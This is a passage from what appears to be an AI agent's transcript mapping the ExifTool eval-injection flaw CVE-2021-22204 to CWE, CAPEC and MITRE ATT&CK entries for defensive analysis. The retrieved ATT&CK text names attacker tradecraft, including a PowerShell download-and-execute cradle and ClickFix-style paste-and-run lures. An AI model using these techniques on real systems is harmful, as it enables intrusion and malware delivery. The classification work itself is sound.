CAPEC-254 DEPRECATED: DTD Injection in a SOAP Message:
<Description>: This pattern has been deprecated as it was determined to be an unnecessary layer of abstraction. Please refer to the pattern CAPEC-228 : DTD Injection going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-265 DEPRECATED: Global variable manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-77 : Manipulating User-Controlled Variables". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-679 Exploitation of Improperly Configured or Implemented Memory Protections:
<Description>:  </Description>
<Prerequisites>: Access to the hardware being leveraged. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-702 Exploiting Incorrect Chaining or Granularity of Hardware Debug Components:
<Description>:  </Description>
<Prerequisites>: Hardware device has an exposed debug interface </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-249 DEPRECATED: Linux Terminal Injection:
<Description>: This attack pattern has been deprecated as it is covered by "CAPEC-40 : Manipulating Writeable Terminal Devices". Please refer to this CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-251 Local Code Inclusion:
<Description>: The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways. </Description>
<Prerequisites>: The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture. | Some variants of this attack may require that old versions of some code files be present and in predictable locations. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-10 Buffer Overflow via Environment Variables:
<Description>: This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the adversary finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables. </Description>
<Prerequisites>: The application uses environment variables. | An environment variable exposed to the user is vulnerable to a buffer overflow. | The vulnerable environment variable uses untrusted data. | Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer. </Prerequisites>
</CAPEC>


[14]========================Tool Call (Security Specialist)=========================
semantic_search_capec(query='CAPEC Code Injection 242 CAPEC-242', n=5)

[14]=======================Tool Output (Security Specialist)========================

<CAPEC>
CAPEC-249 DEPRECATED: Linux Terminal Injection:
<Description>: This attack pattern has been deprecated as it is covered by "CAPEC-40 : Manipulating Writeable Terminal Devices". Please refer to this CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-443 Malicious Logic Inserted Into Product by Authorized Developer:
<Description>: An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product. </Description>
<Prerequisites>: Access to the product during the initial or continuous development. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-445 Malicious Logic Insertion into Product Software via Configuration Management Manipulation:
<Description>:  </Description>
<Prerequisites>: Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-264 DEPRECATED: Environment Variable Manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-13 : Subverting Environment Variable Values". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-254 DEPRECATED: DTD Injection in a SOAP Message:
<Description>: This pattern has been deprecated as it was determined to be an unnecessary layer of abstraction. Please refer to the pattern CAPEC-228 : DTD Injection going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


[15]========================Tool Call (Security Specialist)=========================
set_shared_memory(key='cve_exiftool_djvu', value='CVE-2021-22204 – ExifTool DjVu ANT parser RCE via eval of file-controlled tokens (fixed in 12.24 / DjVu.pm v1.07).', override=False)

[15]=======================Tool Output (Security Specialist)========================
Successfully set value for key "cve_exiftool_djvu".

[16]========================Tool Call (Security Specialist)=========================
set_shared_memory(key='cwe_primary', value='CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (\'Eval Injection\') – eval qq{"$tok"} on file-controlled token with incomplete escaping.', override=False)

[16]=======================Tool Output (Security Specialist)========================
Successfully set value for key "cwe_primary".

[17]========================Tool Call (Security Specialist)=========================
set_shared_memory(key='cwe_related', value='CWE-94 (Code Injection), CWE-77 (Command Injection) [environment/OS command invocation via eval], CWE-184 (Incomplete List of Disallowed Inputs), CWE-20 (Improper Input Validation), CWE-150 (Improper Neutralization of Escape/Meta/Control Sequences).', override=False)

[17]=======================Tool Output (Security Specialist)========================
Successfully set value for key "cwe_related".

[18]========================Tool Call (Security Specialist)=========================
semantic_search_attack_techniques(query='MITRE ATT&CK technique code execution via malicious file processed by media metadata parser exiftool CVE-2021-22204', n=10)

[18]=======================Tool Output (Security Specialist)========================

<ATT&CK-TECHNIQUE>
T1204.001 Malicious Link:
<Description>: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002). </Description>
<Tactics>: execution </Tactics>
</ATT&CK-TECHNIQUE>


<ATT&CK-TECHNIQUE>
T1204.004 Malicious Copy and Paste:
<Description>: An adversary may rely upon a user copying and pasting code in order to gain execution. Users may be subjected to social engineering to get them to copy and paste code directly into a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).  

Malicious websites, such as those used in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), may present fake error messages or CAPTCHA prompts that instruct users to open a terminal or the Windows Run Dialog box and execute an arbitrary command. These commands may be obfuscated using encoding or other techniques to conceal malicious intent. Once executed, the adversary will typically be able to establish a foothold on the victim's machine.(Citation: CloudSEK Lumma Stealer 2024)(Citation: Sekoia ClickFake 2025)(Citation: Reliaquest CAPTCHA 2024)(Citation: AhnLab LummaC2 2025)

Adversaries may also leverage phishing emails for this purpose. When a user attempts to open an attachment, they may be presented with a fake error and offered a malicious command to paste as a solution.(Citation: Proofpoint ClickFix 2024)(Citation: AhnLab Malicioys Copy Paste 2024)

Tricking a user into executing a command themselves may help to bypass email filtering, browser sandboxing, or other mitigations designed to protect users against malicious downloaded files.  </Description>
<Tactics>: execution </Tactics>
</ATT&CK-TECHNIQUE>


<ATT&CK-TECHNIQUE>
T1202 Indirect Command Execution:
<Description>: Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping Computer - Scriptrunner.exe) Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file.(Citation: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)

Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads. </Description>
<Tactics>: defense-evasion </Tactics>
</ATT&CK-TECHNIQUE>


<ATT&CK-TECHNIQUE>
T1560.001 Archive via Utility:
<Description>: Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.

Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. 

On Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. 

Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage) </Description>
<Tactics>: collection </Tactics>
</ATT&CK-TECHNIQUE>


<ATT&CK-TECHNIQUE>
T1036.008 Masquerade File Type:
<Description>: Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. 

Adversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. 

Common non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.

Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID) </Description>
<Tactics>: defense-evasion </Tactics>
</ATT&CK-TECHNIQUE>


<ATT&CK-TECHNIQUE>
T1204.002 Malicious File:
<Description>: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.

Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) 

While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534). </Description>
<Tactics>: execution </Tactics>
</ATT&CK-TECHNIQUE>


<ATT&CK-TECHNIQUE>
T1204 User Execution:
<Description>: An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).

While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).

Adversaries may also deceive users into performing actions such as:

* Enabling [Remote Access Tools](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary
* Running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)
* Downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204)
* Coerceing users to copy, paste, and execute malicious code manually(Citation: Reliaquest-execution)(Citation: proofpoint-selfpwn)

For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Tools](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery) </Description>
<Tactics>: execution </Tactics>
</ATT&CK-TECHNIQUE>


<ATT&CK-TECHNIQUE>
T1491 Defacement:
<Description>: Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. 
 </Description>
<Tactics>: impact </Tactics>
</ATT&CK-TECHNIQUE>


<ATT&CK-TECHNIQUE>
T1105 Ingress Tool Transfer:
<Description>: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). 

On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)

Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)

Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync) </Description>
<Tactics>: command-and-control </Tactics>
</ATT&CK-TECHNIQUE>


<ATT&CK-TECHNIQUE>
T1213.003 Code Repositories:
<Description>: Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.

Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or [Unsecured Credentials](https://attack.mitre.org/techniques/T1552) contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)

**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories. </Description>
<Tactics>: collection </Tactics>
</ATT&CK-TECHNIQUE>


[19]========================Tool Call (Security Specialist)=========================
set_shared_memory(key='capec_relevant', value='CAPEC-242: Code Injection; CAPEC-248: Command Injection; CAPEC-19: Embedding Scripts within Scripts; CAPEC-17: Using Malicious Files. Rationale: attacker supplies crafted file content that is evaluated as code by the parser, enabling arbitrary code/command execution during file processing.', override=False)

[19]=======================Tool Output (Security Specialist)========================
Successfully set value for key "capec_relevant".

[20]========================Tool Call (Security Specialist)=========================
semantic_search_attack_mitigations(query='ATT&CK mitigations for malicious file, exploit public-facing application, execution prevention, sandboxing, allow-listing, disable features', n=7)

[20]=======================Tool Output (Security Specialist)========================

<ATT&CK-MITIGATION>
M1042 Disable or Remove Feature or Program:
<Description>: Disable or remove unnecessary and potentially vulnerable software, features, or services to reduce the attack surface and prevent abuse by adversaries. This involves identifying software or features that are no longer needed or that could be exploited and ensuring they are either removed or properly disabled. This mitigation can be implemented through the following measures: 

Remove Legacy Software:

- Use Case: Disable or remove older versions of software that no longer receive updates or security patches (e.g., legacy Java, Adobe Flash).
- Implementation: A company removes Flash Player from all employee systems after it has reached its end-of-life date.

Disable Unused Features:

- Use Case: Turn off unnecessary operating system features like SMBv1, Telnet, or RDP if they are not required.
- Implementation: Disable SMBv1 in a Windows environment to mitigate vulnerabilities like EternalBlue.

Control Applications Installed by Users:

- Use Case: Prevent users from installing unauthorized software via group policies or other management tools.
- Implementation: Block user installations of unauthorized file-sharing applications (e.g., BitTorrent clients) in an enterprise environment.

Remove Unnecessary Services:

- Use Case: Identify and disable unnecessary default services running on endpoints, servers, or network devices.
- Implementation: Disable unused administrative shares (e.g., C$, ADMIN$) on workstations.

Restrict Add-ons and Plugins:

- Use Case: Remove or disable browser plugins and add-ons that are not needed for business purposes.
- Implementation: Disable Java and ActiveX plugins in web browsers to prevent drive-by attacks.

 </Description>
</ATT&CK-MITIGATION>


<ATT&CK-MITIGATION>
M1048 Application Isolation and Sandboxing:
<Description>: Application Isolation and Sandboxing refers to the technique of restricting the execution of code to a controlled and isolated environment (e.g., a virtual environment, container, or sandbox). This method prevents potentially malicious code from affecting the rest of the system or network by limiting access to sensitive resources and critical operations. The goal is to contain threats and minimize their impact. This mitigation can be implemented through the following measures:

Browser Sandboxing:

- Use Case: Implement browser sandboxing to isolate untrusted web content, preventing malicious web pages or scripts from accessing sensitive system files.
- Implementation: Use tools like Google Chrome's built-in sandbox or deploy solutions like Bromium to secure user web interactions.

Application Virtualization:

- Use Case: Deploy critical or high-risk applications in a virtualized environment to ensure any compromise does not affect the host system.
- Implementation: Use application virtualization platforms to run applications in isolated environments.

Email Attachment Sandboxing:

- Use Case: Route email attachments to a sandbox environment to detect and block malware before delivering emails to end-users.
- Implementation: Integrate security solutions with sandbox capabilities to analyze email attachments.

Endpoint Sandboxing:

- Use Case: Run all downloaded files and applications in a restricted environment to monitor their behavior for malicious activity.
- Implementation: Use endpoint protection tools for sandboxing at the endpoint level. </Description>
</ATT&CK-MITIGATION>


<ATT&CK-MITIGATION>
M1038 Execution Prevention:
<Description>: Prevent the execution of unauthorized or malicious code on systems by implementing application control, script blocking, and other execution prevention mechanisms. This ensures that only trusted and authorized code is executed, reducing the risk of malware and unauthorized actions. This mitigation can be implemented through the following measures:

Application Control:

- Use Case: Use tools like AppLocker or Windows Defender Application Control (WDAC) to create whitelists of authorized applications and block unauthorized ones. On Linux, use tools like SELinux or AppArmor to define mandatory access control policies for application execution.
- Implementation: Allow only digitally signed or pre-approved applications to execute on servers and endpoints. (e.g., `New-AppLockerPolicy -PolicyType Enforced -FilePath "C:\Policies\AppLocker.xml"`) 


Script Blocking:

- Use Case: Use script control mechanisms to block unauthorized execution of scripts, such as PowerShell or JavaScript. Web Browsers: Use browser extensions or settings to block JavaScript execution from untrusted sources.
- Implementation: Configure PowerShell to enforce Constrained Language Mode for non-administrator users. (e.g., `Set-ExecutionPolicy AllSigned`) 

Executable Blocking:

- Use Case: Prevent execution of binaries from suspicious locations, such as `%TEMP%` or `%APPDATA%` directories.
- Implementation: Block execution of `.exe`, `.bat`, or `.ps1` files from user-writable directories.

Dynamic Analysis Prevention:
- Use Case: Use behavior-based execution prevention tools to identify and block malicious activity in real time.
- Implemenation: Employ EDR solutions that analyze runtime behavior and block suspicious code execution. </Description>
</ATT&CK-MITIGATION>


<ATT&CK-MITIGATION>
M1055 Do Not Mitigate:
<Description>: The Do Not Mitigate category highlights scenarios where attempting to mitigate a specific technique may inadvertently increase the organization's security risk or operational instability. This could happen due to the complexity of the system, the integration of critical processes, or the potential for introducing new vulnerabilities. Instead of direct mitigation, these situations may call for alternative strategies such as detection, monitoring, or response. The Do Not Mitigate category underscores the importance of assessing the trade-offs between mitigation efforts and overall system integrity. This mitigation can be implemented through the following measures:

Complex Systems Where Mitigation is Risky:

- Interpretation: In certain systems, direct mitigation could introduce new risks, especially if the system is highly interconnected or complex, such as in legacy industrial control systems (ICS). Patching or modifying these systems could result in unplanned downtime, disruptions, or even safety risks.
- Use Case: In a power grid control system, attempting to patch or disable certain services related to device communications might disrupt critical operations, leading to unintended service outages.

Risk of Reducing Security Coverage:

- Interpretation: In some cases, mitigating a technique might reduce the visibility or effectiveness of other security controls, limiting an organization’s ability to detect broader attacks.
- Use Case: Disabling script execution on a web server to mitigate potential PowerShell-based attacks could interfere with legitimate administrative operations that rely on scripting, while attackers may still find alternate ways to execute code.

Introduction of New Vulnerabilities:

- Interpretation: In highly sensitive or tightly controlled environments, implementing certain mitigations might create vulnerabilities in other parts of the system. For instance, disabling default security mechanisms in an attempt to resolve compatibility issues may open the system to exploitation.
- Use Case: Disabling certificate validation to resolve internal communication issues in a secure environment could lead to man-in-the-middle attacks, creating a greater vulnerability than the original problem.

Negative Impact on Performance and Availability:

- Interpretation: Mitigations that involve removing or restricting system functionalities can have unintended consequences for system performance and availability. Some mitigations, while effective at blocking certain attacks, may introduce performance bottlenecks or compromise essential operations.
- Use Case: Implementing high levels of encryption to mitigate data theft might result in significant performance degradation in systems handling large volumes of real-time transactions. </Description>
</ATT&CK-MITIGATION>


<ATT&CK-MITIGATION>
M1013 Application Developer Guidance:
<Description>: Application Developer Guidance focuses on providing developers with the knowledge, tools, and best practices needed to write secure code, reduce vulnerabilities, and implement secure design principles. By integrating security throughout the software development lifecycle (SDLC), this mitigation aims to prevent the introduction of exploitable weaknesses in applications, systems, and APIs. This mitigation can be implemented through the following measures:
 
Preventing SQL Injection (Secure Coding Practice):

- Implementation: Train developers to use parameterized queries or prepared statements instead of directly embedding user input into SQL queries.
- Use Case: A web application accepts user input to search a database. By sanitizing and validating user inputs, developers can prevent attackers from injecting malicious SQL commands.

Cross-Site Scripting (XSS) Mitigation:

- Implementation: Require developers to implement output encoding for all user-generated content displayed on a web page.
- Use Case: An e-commerce site allows users to leave product reviews. Properly encoding and escaping user inputs prevents malicious scripts from being executed in other users’ browsers.

Secure API Design:

- Implementation: Train developers to authenticate all API endpoints and avoid exposing sensitive information in API responses.
- Use Case: A mobile banking application uses APIs for account management. By enforcing token-based authentication for every API call, developers reduce the risk of unauthorized access.

Static Code Analysis in the Build Pipeline:

- Implementation: Incorporate tools into CI/CD pipelines to automatically scan for vulnerabilities during the build process.
- Use Case: A fintech company integrates static analysis tools to detect hardcoded credentials in their source code before deployment.

Threat Modeling in the Design Phase:

- Implementation: Use frameworks like STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) to assess threats during application design.
- Use Case: Before launching a customer portal, a SaaS company identifies potential abuse cases, such as session hijacking, and designs mitigations like secure session management.

**Tools for Implementation**:

- Static Code Analysis Tools: Use tools that can scan for known vulnerabilities in source code.
- Dynamic Application Security Testing (DAST): Use tools like Burp Suite or OWASP ZAP to simulate runtime attacks and identify vulnerabilities.
- Secure Frameworks: Recommend secure-by-default frameworks (e.g., Django for Python, Spring Security for Java) that enforce security best practices. </Description>
</ATT&CK-MITIGATION>


<ATT&CK-MITIGATION>
M1050 Exploit Protection:
<Description>: Deploy capabilities that detect, block, and mitigate conditions indicative of software exploits. These capabilities aim to prevent exploitation by addressing vulnerabilities, monitoring anomalous behaviors, and applying exploit-mitigation techniques to harden systems and software.

Operating System Exploit Protections:

- Use Case: Enable built-in exploit protection features provided by modern operating systems, such as Microsoft's Exploit Protection, which includes techniques like Data Execution Prevention (DEP), Address Space Layout Randomization (ASLR), and Control Flow Guard (CFG).
- Implementation: Enforce DEP for all programs and enable ASLR to randomize memory addresses used by system and application processes. Windows: Configure Exploit Protection through the Windows Security app or deploy settings via Group Policy.
`ExploitProtectionExportSettings.exe -path "exploit_settings.xml"`
Linux: Use Kernel-level hardening features like SELinux, AppArmor, or GRSEC to enforce memory protections and prevent exploits.

Third-Party Endpoint Security:

- Use Case: Use endpoint protection tools with built-in exploit protection, such as enhanced memory protection, behavior monitoring, and real-time exploit detection.
- Implementation: Deploy tools to detect and block exploitation attempts targeting unpatched software.

Virtual Patching:
- Use Case: Use tools to implement virtual patches that mitigate vulnerabilities in applications or operating systems until official patches are applied.
- Implementation: Use Intrusion Prevention System (IPS) to block exploitation attempts on known vulnerabilities in outdated applications.

Hardening Application Configurations:

- Use Case: Disable risky application features that can be exploited, such as macros in Microsoft Office or JScript in Internet Explorer.
- Implementation: Configure Microsoft Office Group Policies to disable execution of macros in downloaded files. </Description>
</ATT&CK-MITIGATION>


<ATT&CK-MITIGATION>
M1040 Behavior Prevention on Endpoint:
<Description>: Behavior Prevention on Endpoint refers to the use of technologies and strategies to detect and block potentially malicious activities by analyzing the behavior of processes, files, API calls, and other endpoint events. Rather than relying solely on known signatures, this approach leverages heuristics, machine learning, and real-time monitoring to identify anomalous patterns indicative of an attack. This mitigation can be implemented through the following measures:

Suspicious Process Behavior:

- Implementation: Use Endpoint Detection and Response (EDR) tools to monitor and block processes exhibiting unusual behavior, such as privilege escalation attempts.
- Use Case: An attacker uses a known vulnerability to spawn a privileged process from a user-level application. The endpoint tool detects the abnormal parent-child process relationship and blocks the action.

Unauthorized File Access:

- Implementation: Leverage Data Loss Prevention (DLP) or endpoint tools to block processes attempting to access sensitive files without proper authorization.
- Use Case: A process tries to read or modify a sensitive file located in a restricted directory, such as /etc/shadow on Linux or the SAM registry hive on Windows. The endpoint tool identifies this anomalous behavior and prevents it.

Abnormal API Calls:

- Implementation: Implement runtime analysis tools to monitor API calls and block those associated with malicious activities.
- Use Case: A process dynamically injects itself into another process to hijack its execution. The endpoint detects the abnormal use of APIs like `OpenProcess` and `WriteProcessMemory` and terminates the offending process.

Exploit Prevention:

- Implementation: Use behavioral exploit prevention tools to detect and block exploits attempting to gain unauthorized access.
- Use Case: A buffer overflow exploit is launched against a vulnerable application. The endpoint detects the anomalous memory write operation and halts the process. </Description>
</ATT&CK-MITIGATION>


[21]========================Tool Call (Security Specialist)=========================
semantic_search_attack_tactics(query='ATT&CK tactics user execution malicious file code execution via parsing metadata pipeline exiftool', n=5)

[21]=======================Tool Output (Security Specialist)========================

<ATT&CK-TACTIC>
TA0002 Execution:
<Description>: The adversary is trying to run malicious code.

Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.  </Description>
<Short_Name>: execution </Short_Name>
</ATT&CK-TACTIC>


<ATT&CK-TACTIC>
TA0006 Credential Access:
<Description>: The adversary is trying to steal account names and passwords.

Credential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals. </Description>
<Short_Name>: credential-access </Short_Name>
</ATT&CK-TACTIC>


<ATT&CK-TACTIC>
TA0010 Exfiltration:
<Description>: The adversary is trying to steal data.

Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission. </Description>
<Short_Name>: exfiltration </Short_Name>
</ATT&CK-TACTIC>


<ATT&CK-TACTIC>
TA0001 Initial Access:
<Description>: The adversary is trying to get into your network.

Initial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords. </Description>
<Short_Name>: initial-access </Short_Name>
</ATT&CK-TACTIC>


<ATT&CK-TACTIC>
TA0009 Collection:
<Description>: The adversary is trying to gather data of interest to their goal.

Collection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input. </Description>
<Short_Name>: collection </Short_Name>
</ATT&CK-TACTIC>


[22]========================Tool Call (Security Specialist)=========================
set_shared_memory(key='attack_ttps', value='T1190 (Exploit Public-Facing Application), T1203 (Exploitation for Client Execution), T1204.002 (User Execution: Malicious File), T1036.008 (Masquerade File Type), T1059 (Command and Scripting Interpreter).', override=False)

[22]=======================Tool Output (Security Specialist)========================
Successfully set value for key "attack_ttps".

[23]========================Tool Call (Security Specialist)=========================
